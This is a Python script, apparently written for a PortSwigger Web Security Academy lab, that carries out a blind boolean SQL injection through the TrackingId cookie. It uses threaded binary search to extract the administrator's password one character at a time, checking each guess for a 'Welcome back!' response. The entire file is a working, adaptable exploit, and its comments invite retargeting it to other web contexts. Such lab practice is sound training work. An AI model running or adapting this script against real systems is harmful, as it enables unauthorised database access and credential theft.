import requests
import sys
from urllib.parse import quote
from urllib3.exceptions import InsecureRequestWarning
import time
from concurrent.futures import ThreadPoolExecutor

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

'''
Change the base request to fit the web context
Insert the injStr at the right place
'''
def base_request(injStr, proxy):
    proxies = {
        'http': proxy,
        'https': proxy
    }
    url = "https://0a5800fd04cc68c5800cda7300a90047.web-security-academy.net:443/"
    cookies = {"TrackingId": "OMnmWPRHvzjILyHX" + injStr, "session": "l8ivGYC7UE7XA08Hjl53NltTt1TQ8VV9"}
    res = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    return res

def is_true_condition(res):
    return 'Welcome back!' in res.text

'''
Change the injStr to fit your payload
'''
def sqli_extract_length(query, lo = 2, hi = 100, proxy=''):        
    while lo <= hi:
        mid = lo + (hi - lo) // 2

        injStr = f"' AND LENGTH(({query})) > {mid} AND '1'='1"
        injStr = quote(injStr)            
        res = base_request(injStr, proxy)

        if is_true_condition(res): 
            lo = mid + 1
        else:
            hi = mid - 1

    return lo


'''
Change the injStr to fit your payload
'''
def sqli_binsearch_extract_single_char(query, pos, lo = 9, hi = 126, proxy = ''):
    #binary search logic
    while lo <= hi:
        mid = lo + (hi - lo) // 2

        injStr = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid} AND '1'='1"
        injStr = quote(injStr)            
        res = base_request(injStr, proxy)

        if is_true_condition(res): 
            lo = mid + 1
        else:
            hi = mid - 1

    return chr(lo)

def sqli_binsearch_extract_data_with_threads(query, dataLen, threads = 1, lo = 9, hi = 126, verbose = True, proxy=''):
    extracted = ''
    posArr = list(range(1, dataLen + 1))
    for i in range(1, dataLen + 1, threads):
        tPosArr = posArr[i:i+threads]

        kwargs_names = []
        for tPos in tPosArr:
            kwargs_names.append({'query': query, 'pos': tPos, 'lo': lo, 'hi': hi, 'proxy': proxy})
        kwargs_names = tuple(kwargs_names)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(lambda f: sqli_binsearch_extract_single_char(**f), kwargs_names)
            for result in results:
                extracted += result
        if verbose:
            sys.stdout.write('\033[2K\033[1G')
            sys.stdout.write(extracted)
            sys.stdout.flush()
    sys.stdout.write('\n')
    return extracted
    


def main():
    startTime = time.time()

    proxy = 'http://127.0.0.1:8080'

    query = "SELECT password FROM users WHERE username='administrator'"

    print("[+] Determining data length...")
    dataLen = sqli_extract_length(query=query, proxy=proxy)
    print(f"==> Got {dataLen} chars")

    print("[+] Start extracting...")
    data = sqli_binsearch_extract_data_with_threads(query=query, dataLen=dataLen, proxy=proxy)
    print("==> Extracted data:", data)

    print(f"[+] Script finish in: {time.time() - startTime}")


if __name__ == "__main__":
    main()